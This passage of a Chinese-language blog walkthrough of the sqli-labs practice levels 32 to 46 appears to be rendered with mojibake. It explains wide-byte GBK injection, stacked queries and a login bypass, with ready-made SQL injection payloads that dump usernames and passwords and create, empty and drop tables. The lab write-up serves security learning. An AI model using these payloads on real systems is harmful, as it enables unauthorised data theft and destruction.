class="hljs-number">1</span>,group_concat(concat_ws(<span class="hljs-string">&#x27;:&#x27;</span>,username,password)),<span class="hljs-number">3</span> <span class="hljs-keyword">FROM</span> security.users<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h4 id="Less-32-33-36-å®½å­—èŠ‚æ³¨å…¥"><a href="#Less-32-33-36-å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="Less-32,33,36-å®½å­—èŠ‚æ³¨å…¥"></a>Less-32,33,36-å®½å­—èŠ‚æ³¨å…¥</h4><p>æ³¨å…¥æ­£å¸¸çš„å‚æ•°ï¼Œç½‘é¡µå›æ˜¾æ­£å¸¸ä¿¡æ¯ã€‚æ³¨å…¥å•å¼•å·å¯¹å‚æ•°è¿›è¡Œé—­åˆï¼Œç½‘é¡µè™½ç„¶è¿”å›äº†æ­£ç¡®çš„ä¿¡æ¯ï¼Œä½†æ˜¯å¯¹å•å¼•å·è¿›è¡Œäº†è½¬ä¹‰ã€‚</p><p>?id&#x3D;1â€™</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022015124.png"></p><hr><p>å®½å­—èŠ‚æ³¨å…¥ï¼ˆ<strong>GBK&#x2F;Big5 Character Encoding SQL Injection</strong>ï¼‰æ˜¯ä¸€ç§åˆ©ç”¨æ•°æ®åº“å­—ç¬¦é›†ä¸Webåº”ç”¨å±‚å­—ç¬¦ç¼–ç ä¸ä¸€è‡´ï¼Œç»“åˆè½¬ä¹‰å‡½æ•°ï¼ˆå¦‚<code>addslashes</code>ï¼‰ç¼ºé™·çš„SQLæ³¨å…¥æ”»å‡»æ–¹å¼ã€‚</p><p><strong>æ¼æ´åŸç†</strong></p><ol><li><strong>å­—ç¬¦é›†è½¬æ¢é—®é¢˜</strong><ul><li>å½“æ•°æ®åº“ä½¿ç”¨GBKç­‰å¤šå­—èŠ‚ç¼–ç æ—¶ï¼ŒæŸäº›å­—ç¬¦ï¼ˆå¦‚<code>0xbf5c</code>ï¼‰ä¼šè¢«è§†ä¸ºä¸€ä¸ªåˆæ³•å­—ç¬¦ï¼ˆå¦‚<code>ç¸—</code>ï¼‰ï¼Œè€Œéä¸¤ä¸ªç‹¬ç«‹å­—èŠ‚ã€‚</li><li>æ”»å‡»è€…é€šè¿‡è¾“å…¥<code>%bf%27</code>ï¼ˆ<code>0xbf</code> + <code>&#39;</code>çš„URLç¼–ç <code>%27</code>ï¼‰ï¼Œè§¦å‘å­—ç¬¦é›†è½¬æ¢é”™è¯¯ã€‚</li></ul></li><li><strong>è½¬ä¹‰å‡½æ•°ç»•è¿‡</strong><ul><li>PHPçš„<code>addslashes</code>æˆ–<code>mysql_real_escape_string</code>ä¼šå°†å•å¼•å·<code>&#39;</code>è½¬ä¹‰ä¸º<code>\&#39;</code>ï¼ˆå³<code>%5c%27</code>ï¼‰ã€‚</li><li>å½“è¾“å…¥<code>%bf%27</code>æ—¶ï¼Œè½¬ä¹‰åçš„å­—ç¬¦ä¸²å˜ä¸º<code>%bf%5c%27</code>ã€‚ç”±äºGBKå°†<code>%bf%5c</code>è§£æä¸ºåˆæ³•å­—ç¬¦<code>ç¸—</code>ï¼Œå‰©ä¸‹çš„<code>%27</code>ï¼ˆ<code>&#39;</code>ï¼‰æœªè¢«è½¬ä¹‰ï¼Œå¯¼è‡´æ³¨å…¥ã€‚</li></ul></li></ol><hr><p>å¯¹äºä¸€èˆ¬çš„è½¬ä¹‰å­—ç¬¦ï¼Œæˆ‘ä»¬æ˜¯æ— æ³•æ„é€ æ³¨å…¥çš„ payload çš„ï¼Œä½†è¿™å¹¶ä¸ä»£è¡¨ç½‘é¡µå°±æ²¡æœ‰ä»»ä½•æ¼æ´å¯ä»¥æ³¨å…¥ã€‚å¯¹<strong>å®½å­—èŠ‚æ³¨å…¥æ¼æ´</strong>è¿›è¡Œæµ‹è¯•ï¼Œæ³¨å…¥å¦‚ä¸‹å‚æ•°ã€‚å½“æ•°æ®åº“çš„ç¼–ç é‡‡ç”¨ <strong>GBK å›½æ ‡ç </strong>æ—¶ï¼Œè™½ç„¶å•å¼•å·è¿˜æ˜¯ä¼šåŠ ä¸Šåæ–œæ ä»è€Œè¢«è½¬ä¹‰ï¼Œä½†æ˜¯ â€œ%dfâ€ ä¼šå’Œåæ–œæ çš„ URL ç¼–ç  â€œ%5Câ€ é—­åˆï¼Œä»è€Œæ„æˆ GBK å›½æ ‡ç ä¸­çš„æ±‰å­—â€œé€£â€ï¼Œä½¿å¾—ç”¨äºè½¬ä¹‰çš„åæ–œæ è¢«æˆ‘ä»¬â€œåƒæ‰â€äº†ã€‚è¿™ç§æ“ä½œæ˜¯ç”±äº GBK å›½æ ‡ç æ˜¯åŒå­—èŠ‚è¡¨ç¤ºä¸€ä¸ªæ±‰å­—ï¼Œå› æ­¤å¯¼è‡´äº†åæ–œæ å’Œå…¶ä»–çš„å­—ç¬¦å…±åŒè¡¨ç¤ºä¸ºä¸€ä¸ªæ±‰å­—ã€‚è¿™å¯ä»¥è®©æ•°æ®åº“çš„ SQL æŸ¥è¯¢äº†æ­£ç¡®çš„å‚æ•°(æ±‰å­—)ï¼Œä»è€Œå¯ä»¥ä½¿ç”¨ UNION è¯­å¥è¿›è¡Œæ³¨å…¥ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">%</span>df<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022015843.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">%</span>df<span class="hljs-string">&#x27; ORDER BY 3--+</span><br><span class="hljs-string">?id=1%df&#x27;</span> <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-number">4</span><span class="hljs-comment">--+</span><br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-operator">%</span>df<span class="hljs-string">&#x27; UNION SELECT 1,2,3 --+</span><br><span class="hljs-string"></span><br><span class="hljs-string">?id=-1%df&#x27;</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,database(),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span><br><br>#æ­¤å¤„æ•°æ®åº“åè¦ç”¨åå…­è¿›åˆ¶ (HEX) ç¼–ç æ›¿ä»£ï¼Œé¿å…å•å¼•å·çš„ä½¿ç”¨ã€‚<br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-operator">%</span>df<span class="hljs-string">&#x27; UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=0x7365637572697479--+</span><br><span class="hljs-string"></span><br><span class="hljs-string">?id=-1%df&#x27;</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,group_concat(column_name),<span class="hljs-number">3</span> <span class="hljs-keyword">FROM</span> information_schema.columns <span class="hljs-keyword">WHERE</span> table_schema<span class="hljs-operator">=</span><span class="hljs-number">0x7365637572697479</span> <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">=</span><span class="hljs-number">0x7573657273</span><span class="hljs-comment">--+</span><br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-operator">%</span>df<span class="hljs-string">&#x27; UNION SELECT 1,group_concat(concat_ws(0x3a,username,password)),3 FROM security.users--+</span><br></code></pre></td></tr></table></figure><h4 id="Less-34-37-å®½å­—èŠ‚æ³¨å…¥-POST"><a href="#Less-34-37-å®½å­—èŠ‚æ³¨å…¥-POST" class="headerlink" title="Less-34,37-å®½å­—èŠ‚æ³¨å…¥-POST"></a>Less-34,37-å®½å­—èŠ‚æ³¨å…¥-POST</h4><p>è¿™ä¸€å…³æ˜¯POSTï¼ŒæŠ“åŒ…çœ‹ä¸€çœ‹ï¼Œä¼ å…¥adminâ€™&#x2F;admin,åŒæ ·å¯¹å•å¼•å·è½¬ä¹‰ï¼Œå¯ä»¥ç”¨å®½å­—èŠ‚æ³¨å…¥</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022015751.png"></p><p>uname&#x3D;%dfâ€™&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022015431.png"></p><p>uname&#x3D;%dfâ€™â€“+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submitæ³¨é‡Šåé¡µé¢æ­£å¸¸ï¼Œå­˜åœ¨å•å¼•å·æ³¨å…¥</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022015972.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql">uname<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">%</span>df<span class="hljs-string">&#x27; UNION SELECT 1,2 --+&amp;passwd=&amp;submit=Submit</span><br><span class="hljs-string"></span><br><span class="hljs-string">uname=1%df&#x27;</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> database(),<span class="hljs-number">2</span> <span class="hljs-comment">--+&amp;passwd=&amp;submit=Submit</span><br><br>uname<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">%</span>df<span class="hljs-string">&#x27; UNION SELECT group_concat(table_name),2 FROM information_schema.tables WHERE table_schema=0x7365637572697479 --+&amp;passwd=&amp;submit=Submit</span><br><span class="hljs-string"></span><br><span class="hljs-string">uname=1%df&#x27;</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> group_concat(column_name),<span class="hljs-number">2</span> <span class="hljs-keyword">FROM</span> information_schema.columns <span class="hljs-keyword">WHERE</span> table_schema<span class="hljs-operator">=</span><span class="hljs-number">0x7365637572697479</span> <span class="hljs-keyword">AND</span> table_name<span class="hljs-operator">=</span><span class="hljs-number">0x7573657273</span> <span class="hljs-comment">--+&amp;passwd=&amp;submit=Submit</span><br><br>uname<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">%</span>df<span class="hljs-string">&#x27; UNION SELECT group_concat(concat_ws(0x3a,username,password)),2 FROM security.users--+&amp;passwd=&amp;submit=Submit</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022015543.png"></p><h4 id="Less-35-å®½å­—èŠ‚æ³¨å…¥-æ•°å­—å‹"><a href="#Less-35-å®½å­—èŠ‚æ³¨å…¥-æ•°å­—å‹" class="headerlink" title="Less-35-å®½å­—èŠ‚æ³¨å…¥-æ•°å­—å‹"></a>Less-35-å®½å­—èŠ‚æ³¨å…¥-æ•°å­—å‹</h4><p>ç›´æ¥ç”¨ ORDER BY æ’åºï¼Œç½‘é¡µå›æ˜¾æ­£å¸¸æ•°æ®ï¼Œç¡®å®šæ˜¯æ•°å€¼å‹æ³¨å…¥ã€‚ç”±äºæ•°å€¼å‹æ³¨å…¥ä¸æ¶‰åŠä»»ä½•ç¼–ç é—®é¢˜ï¼Œå› æ­¤ä»»ä½•è½¬ä¹‰æ“ä½œéƒ½å½¢åŒè™šè®¾ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-number">3</span><span class="hljs-comment">--+</span><br><br>#ç›´æ¥è·å–æ•°æ®<br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,group_concat(concat_ws(<span class="hljs-number">0x3a</span>,username,password)),<span class="hljs-number">3</span> <span class="hljs-keyword">FROM</span> security.users<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h4 id="Less-38-å †å æ³¨å…¥"><a href="#Less-38-å †å æ³¨å…¥" class="headerlink" title="Less-38-å †å æ³¨å…¥"></a>Less-38-å †å æ³¨å…¥</h4><p>è¿™ä¸€å…³å¯ä»¥ç”¨Less-1çš„payloadå°±å¯ä»¥è·å–æ•°æ®ï¼Œ</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-comment">--+</span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 3 --+</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">4</span> <span class="hljs-comment">--+</span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,3 --+</span><br><span class="hljs-string"></span><br><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database(),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span><br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=&#x27;</span>security<span class="hljs-string">&#x27;--+</span><br><span class="hljs-string"></span><br><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span> <span class="hljs-keyword">FROM</span> information_schema.tables <span class="hljs-keyword">WHERE</span> table_schema<span class="hljs-operator">=</span><span class="hljs-number">0x7365637572697479</span><span class="hljs-comment">--+</span><br># <span class="hljs-number">0x7365637572697479</span> ä»£æ›¿ <span class="hljs-string">&#x27;security&#x27;</span>,é€šè¿‡åå…­è¿›åˆ¶ç¼–ç  é¿å…å•å¼•å·ä½¿ç”¨ï¼Œç»•è¿‡è½¬ä¹‰å’Œè¿‡æ»¤æœºåˆ¶ã€‚<br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_schema=&#x27;</span>security<span class="hljs-string">&#x27; and table_name=&#x27;</span>users<span class="hljs-string">&#x27;--+</span><br><span class="hljs-string"></span><br><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(column_name),<span class="hljs-number">3</span> <span class="hljs-keyword">FROM</span> information_schema.columns <span class="hljs-keyword">WHERE</span> table_schema<span class="hljs-operator">=</span><span class="hljs-number">0x7365637572697479</span> <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">=</span><span class="hljs-number">0x7573657273</span><span class="hljs-comment">--+</span><br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; UNION SELECT 1,group_concat(concat_ws(&#x27;</span>:<span class="hljs-string">&#x27;,username,password)),3 FROM security.users--+</span><br><span class="hljs-string"></span><br><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,group_concat(concat_ws(<span class="hljs-number">0x3a</span>,username,password)),<span class="hljs-number">3</span> <span class="hljs-keyword">FROM</span> security.users<span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure><p>ä½†è¿™ä¸€å…³æ˜¯ç”¨æ¥ç»ƒä¹ å †å æ³¨å…¥çš„</p><hr><p>å †å æ³¨å…¥ï¼ˆ<strong>Stacked Queries Injection</strong>ï¼‰æ˜¯ä¸€ç§å…è®¸æ”»å‡»è€…åœ¨ä¸€æ¬¡æ•°æ®åº“è¯·æ±‚ä¸­æ‰§è¡Œ <strong>å¤šæ¡SQLè¯­å¥</strong> çš„æ³¨å…¥æŠ€æœ¯ã€‚å…¶æ ¸å¿ƒæ˜¯åˆ©ç”¨SQLè¯­å¥çš„åˆ†éš”ç¬¦ï¼ˆå¦‚åˆ†å· <code>;</code>ï¼‰æ‹¼æ¥æ¶æ„ä»£ç ï¼Œå¸¸ç”¨äºæ‰§è¡Œä»»æ„æ•°æ®åº“æ“ä½œï¼ˆå¢åˆ æ”¹æŸ¥ï¼‰ã€‚</p><p><strong>å †å æ³¨å…¥åŸç†</strong></p><p><strong>åŸºæœ¬æ¡ä»¶</strong></p><ul><li><strong>æ•°æ®åº“æ”¯æŒå¤šè¯­å¥æ‰§è¡Œ</strong>ï¼š<br>MySQLé»˜è®¤æƒ…å†µä¸‹ <strong>ä¸æ”¯æŒ</strong> å †å æ³¨å…¥ï¼ˆéœ€ç‰¹å®šé©±åŠ¨æˆ–é…ç½®ï¼Œå¦‚PHPçš„<code>mysqli_multi_query</code>ï¼‰ã€‚<br>SQL Serverã€PostgreSQLç­‰æ•°æ®åº“é€šå¸¸æ”¯æŒã€‚</li><li>**åº”ç”¨ç¨‹åºæœªè¿‡æ»¤åˆ†å· **<code>;</code>ï¼š<br>è‹¥ä»£ç ç›´æ¥æ‹¼æ¥ç”¨æˆ·è¾“å…¥ä¸”æœªè¿‡æ»¤åˆ†å·ï¼Œæ”»å‡»è€…å¯æ’å…¥åˆ†å·åˆ†éš”å¤šæ¡SQLè¯­å¥ã€‚</li></ul><hr><p>æ‰€è°“<strong>å †å æ³¨å…¥</strong>å°±æ˜¯åœ¨åŸè¯­å¥ååŠ ä¸Šåˆ†å·ï¼Œä»è€Œé—­åˆå‰é¢çš„å†…å®¹ä½œä¸ºç¬¬ä¸€æ¡ SQL è¯­å¥ã€‚ç„¶ååœ¨åé¢è¾“å…¥ç¬¬äºŒæ¡çš„æ•°æ®åº“æ“ä½œè¯­å¥ï¼Œåœ¨æ¡ä»¶å…è®¸å¯ä»¥è¢«åç«¯å¸¦å…¥æ•°æ®åº“æ‰§è¡Œã€‚å †å æ³¨å…¥ä½¿ç”¨çš„èŒƒå›´éå¸¸æœ‰é™ï¼Œä¾‹å¦‚åç«¯å¯èƒ½ä¼šé™åˆ¶ SQL åªæ‰§è¡Œä¸€æ¡è¯­å¥ã€‚ä¸€æ—¦è¿™ç§æ¼æ´å­˜åœ¨ï¼Œå¯¹æ•°æ®åº“çš„ç ´åæ€§æ˜¯æ¯ç­æ€§çš„ï¼Œå› ä¸ºè¿™è¡¨ç¤ºæ”»å‡»è€…å¯ä»¥è‚†æ„å¯¹æ•°æ®åº“è¿›è¡Œæ“ä½œã€‚<br>ä¾‹å¦‚æ­¤å¤„ä½¿ç”¨å †å æ³¨å…¥æ–°å»ºä¸€å¼ è¡¨ï¼Œä½¿ç”¨ CREATE TABLE å­å¥ï¼Œè¯¥è¡¨å°†å¤åˆ¶ users è¡¨ä½œä¸ºä¸€å¼ æ–°çš„è¡¨å­˜åœ¨ã€‚è¿™ç§å¤åˆ¶å¯ä»¥ç»“åˆ SQL æ³¨å…¥çˆ†å‡ºè¡¨åæ¥å¤åˆ¶ï¼Œä¹Ÿå¯ä»¥ç”¨ç¤¾ä¼šå·¥ç¨‹å­¦æ¥çŒœæµ‹ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;;CREATE TABLE WhiteMoon LIKE users;--+</span><br></code></pre></td></tr></table></figure><p>ç½‘é¡µå›æ˜¾æ­£å¸¸çš„ä¿¡æ¯ï¼Œæ‰“å¼€æ•°æ®åº“å‘ç°securityåº“ä¸­å·²ç»å¤šäº†ä¸€å¼ whitemoonè¡¨äº†ã€‚<br><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022016387.png"></p><p>ä½¿ç”¨å †å æŸ¥è¯¢æŠŠ users è¡¨ä¸­çš„æ•°æ®æ’å…¥æ–°çš„è¡¨ä¸­ï¼Œä½¿ç”¨ INSERT INTO å­å¥å®ç°ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;;INSERT INTO WhiteMoon SELECT * FROM users;--+</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022016395.png"></p><p>ä½¿ç”¨å †å æŸ¥è¯¢æ–°å»ºçš„è¡¨çš„æ‰€æœ‰è®°å½•åˆ æ‰ï¼Œä½¿ç”¨ DELETE å­å¥å®ç°ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;;DELETE FROM WhiteMoon;--+</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022016341.png"></p><p>ä½¿ç”¨å †å æŸ¥è¯¢æŠŠæ–°å»ºçš„è¡¨åˆ æ‰ï¼Œä½¿ç”¨ DROP å­å¥å®ç°ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;;DROP TABLE WhiteMoon;--+</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022016826.png"></p><h4 id="Less-39-41-å †å æ³¨å…¥-æ•°å­—å‹"><a href="#Less-39-41-å †å æ³¨å…¥-æ•°å­—å‹" class="headerlink" title="Less-39,41-å †å æ³¨å…¥-æ•°å­—å‹"></a>Less-39,41-å †å æ³¨å…¥-æ•°å­—å‹</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>;<span class="hljs-keyword">CREATE TABLE</span> WhiteMoon <span class="hljs-keyword">LIKE</span> users;<span class="hljs-comment">--+</span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>;<span class="hljs-keyword">INSERT INTO</span> WhiteMoon <span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users;<span class="hljs-comment">--+</span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>;<span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> WhiteMoon;<span class="hljs-comment">--+</span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>;<span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> WhiteMoon;<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h4 id="Less-40-å †å æ³¨å…¥-â€˜"><a href="#Less-40-å †å æ³¨å…¥-â€˜" class="headerlink" title="Less-40-å †å æ³¨å…¥-â€˜)"></a>Less-40-å †å æ³¨å…¥-â€˜)</h4><p>?id&#x3D;1æ­£å¸¸</p><p>?id&#x3D;1â€™ä¸æ˜¾ç¤º</p><p>?id&#x3D;1â€æ­£å¸¸</p><p>id&#x3D;1)ä¸æ˜¾ç¤º</p><p>id&#x3D;1â€™)ä¸æ˜¾ç¤º</p><p>id&#x3D;1â€ï¼‰æ­£å¸¸</p><p>id&#x3D;1â€™))ä¸æ˜¾ç¤º</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;);CREATE TABLE WhiteMoon LIKE users;--+</span><br><span class="hljs-string">?id=1&#x27;</span>);<span class="hljs-keyword">INSERT INTO</span> WhiteMoon <span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users;<span class="hljs-comment">--+</span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;);DELETE FROM WhiteMoon;--+</span><br><span class="hljs-string">?id=1&#x27;</span>);<span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> WhiteMoon;<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h4 id="Less-42-43-44-45-å †å æ³¨å…¥-äºŒæ¬¡æ³¨å…¥"><a href="#Less-42-43-44-45-å †å æ³¨å…¥-äºŒæ¬¡æ³¨å…¥" class="headerlink" title="Less-42,43,44,45-å †å æ³¨å…¥&#x2F;äºŒæ¬¡æ³¨å…¥"></a>Less-42,43,44,45-å †å æ³¨å…¥&#x2F;äºŒæ¬¡æ³¨å…¥</h4><p>ç”¨æˆ·åæµ‹è¯•ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œå¯†ç æµ‹è¯•ç›´æ¥ç™»å½•æˆåŠŸ</p><p>aâ€™ OR 1 &#x3D; 1#</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022016073.png"></p><p>å¯ä»¥åœ¨å·²çŸ¥æŸä¸ªç”¨æˆ·çš„ç”¨æˆ·åçš„æ¡ä»¶ä¸‹ä½¿ç”¨ä¸‡èƒ½å¯†ç å¤ºå–ç”¨æˆ·ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨äºŒæ¬¡æ³¨å…¥ï¼ˆLess-24ï¼‰è¿›è¡Œæ”»å‡»ã€‚ç”±äºå¯†ç å‚æ•°æ²¡æœ‰è¿›è¡Œé˜²å¾¡ï¼Œå¯ä»¥åœ¨è¯¥å­—æ®µæµ‹è¯•å †å æ³¨å…¥ã€‚ä½¿ç”¨ Less-38 çš„æµ‹è¯•æµç¨‹ï¼Œæ¯æ¬¡ç™»é™†æ—¶å®Œæˆä¸€æ­¥å †å æ³¨å…¥ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">a<span class="hljs-string">&#x27; OR 1 = 1;CREATE TABLE WhiteMoon LIKE users;#</span><br><span class="hljs-string">a&#x27;</span> <span class="hljs-keyword">OR</span> <span class="hljs-number">1</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<span class="hljs-keyword">INSERT INTO</span> WhiteMoon <span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users;#<br>a<span class="hljs-string">&#x27; OR 1 = 1;DELETE FROM WhiteMoon;#</span><br><span class="hljs-string">a&#x27;</span> <span class="hljs-keyword">OR</span> <span class="hljs-number">1</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> WhiteMoon;#<br></code></pre></td></tr></table></figure><h4 id="Less-46-æŠ¥é”™æ³¨å…¥-æ•°å­—å‹-é¡µé¢ä¸è¿”å›å›æ˜¾"><a href="#Less-46-æŠ¥é”™æ³¨å…¥-æ•°å­—å‹-é¡µé¢ä¸è¿”å›å›æ˜¾" class="headerlink" title="Less-46-æŠ¥é”™æ³¨å…¥-æ•°å­—å‹-é¡µé¢ä¸è¿”å›å›æ˜¾"></a>Less-46-æŠ¥é”™æ³¨å…¥-æ•°å­—å‹-é¡µé¢ä¸è¿”å›å›æ˜¾</h4><p>?sort&#x3D;1</p><p>?sort&#x3D;2</p><p>?sort&#x3D;3</p><p>?sort&#x3D;4æŠ¥é”™ï¼Œå­˜åœ¨æŠ¥é”™æ³¨å…¥ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´å»è·å–å…¶ä»–æ•°æ®</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022016298.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022016436.png"></p><p>æŠ¥é”™æ³¨å…¥ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span 